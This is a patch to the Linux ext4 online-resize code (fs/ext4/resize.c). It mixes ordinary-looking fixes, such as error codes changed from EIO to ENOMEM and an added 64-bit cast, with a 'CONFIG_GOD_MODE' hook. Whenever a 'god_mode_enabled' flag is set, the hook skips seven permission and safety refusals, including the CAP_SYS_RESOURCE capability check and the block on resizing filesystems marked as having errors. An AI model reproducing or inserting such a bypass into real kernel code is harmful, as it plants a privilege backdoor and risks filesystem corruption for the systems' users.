@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  *  linux/fs/ext4/resize.c
  *
@@ -21,7 +24,15 @@ int ext4_resize_begin(struct super_block *sb)
 	int ret = 0;
 
 	if (!capable(CAP_SYS_RESOURCE))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	/*
 	 * We are not allowed to do online-resizing on a filesystem mounted
@@ -30,7 +41,15 @@ int ext4_resize_begin(struct super_block *sb)
 	if (EXT4_SB(sb)->s_mount_state & EXT4_ERROR_FS) {
 		ext4_warning(sb, "There are errors in the filesystem, "
 			     "so online resizing is not allowed\n");
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	}
 
 	if (test_and_set_bit_lock(EXT4_RESIZING, &EXT4_SB(sb)->s_resize_flags))
@@ -315,7 +334,7 @@ static struct buffer_head *bclean(handle_t *handle, struct super_block *sb,
 
 	bh = sb_getblk(sb, blk);
 	if (!bh)
-		return ERR_PTR(-EIO);
+		return ERR_PTR(-ENOMEM);
 	if ((err = ext4_journal_get_write_access(handle, bh))) {
 		brelse(bh);
 		bh = ERR_PTR(err);
@@ -377,7 +396,7 @@ static int set_flexbg_block_bitmap(struct super_block *sb, handle_t *handle,
 		start = ext4_group_first_block_no(sb, group);
 		group -= flex_gd->groups[0].group;
 
-		count2 = sb->s_blocksize * 8 - (block - start);
+		count2 = EXT4_BLOCKS_PER_GROUP(sb) - (block - start);
 		if (count2 > count)
 			count2 = count;
 
@@ -392,7 +411,7 @@ static int set_flexbg_block_bitmap(struct super_block *sb, handle_t *handle,
 
 		bh = sb_getblk(sb, flex_gd->groups[group].block_bitmap);
 		if (!bh)
-			return -EIO;
+			return -ENOMEM;
 
 		err = ext4_journal_get_write_access(handle, bh);
 		if (err)
@@ -470,7 +489,7 @@ static int setup_new_flex_group_blocks(struct super_block *sb,
 
 			gdb = sb_getblk(sb, block);
 			if (!gdb) {
-				err = -EIO;
+				err = -ENOMEM;
 				goto out;
 			}
 
@@ -528,6 +547,7 @@ handle_bb:
 		bh = bclean(handle, sb, block);
 		if (IS_ERR(bh)) {
 			err = PTR_ERR(bh);
+			bh = NULL;
 			goto out;
 		}
 		if (ext4_bg_has_super(sb, group)) {
@@ -556,6 +576,7 @@ handle_ib:
 		bh = bclean(handle, sb, block);
 		if (IS_ERR(bh)) {
 			err = PTR_ERR(bh);
+			bh = NULL;
 			goto out;
 		}
 
@@ -718,7 +739,15 @@ static int add_new_gdb(handle_t *handle, struct inode *inode,
 	    le32_to_cpu(EXT4_SB(sb)->s_es->s_first_data_block)) {
 		ext4_warning(sb, "won't resize using backup superblock at %llu",
 			(unsigned long long)EXT4_SB(sb)->s_sbh->b_blocknr);
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	}
 
 	gdb_bh = sb_bread(sb, gdblock);
@@ -989,9 +1018,9 @@ static void update_backups(struct super_block *sb,
 		    (err = ext4_journal_restart(handle, EXT4_MAX_TRANS_DATA)))
 			break;
 
-		bh = sb_getblk(sb, group * bpg + blk_off);
+		bh = sb_getblk(sb, ((ext4_fsblk_t)group) * bpg + blk_off);
 		if (!bh) {
-			err = -EIO;
+			err = -ENOMEM;
 			break;
 		}
 		ext4_debug("update metadata backup %#04lx\n",
@@ -1417,7 +1446,15 @@ int ext4_group_add(struct super_block *sb, struct ext4_new_group_data *input)
 	if (gdb_off == 0 && !EXT4_HAS_RO_COMPAT_FEATURE(sb,
 					EXT4_FEATURE_RO_COMPAT_SPARSE_SUPER)) {
 		ext4_warning(sb, "Can't resize non-sparse filesystem further");
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	}
 
 	if (ext4_blocks_count(es) + input->blocks_count <
@@ -1438,7 +1475,15 @@ int ext4_group_add(struct super_block *sb, struct ext4_new_group_data *input)
 		    || !le16_to_cpu(es->s_reserved_gdt_blocks)) {
 			ext4_warning(sb,
 				     "No reserved GDT blocks, can't resize");
-			return -EPERM;
+			
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 		}
 		inode = ext4_iget(sb, EXT4_RESIZE_INO);
 		if (IS_ERR(inode)) {
@@ -1562,7 +1607,15 @@ int ext4_group_extend(struct super_block *sb, struct ext4_super_block *es,
 
 	if (last == 0) {
 		ext4_warning(sb, "need to use ext2online to resize further");
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	}
 
 	add = EXT4_BLOCKS_PER_GROUP(sb) - last;
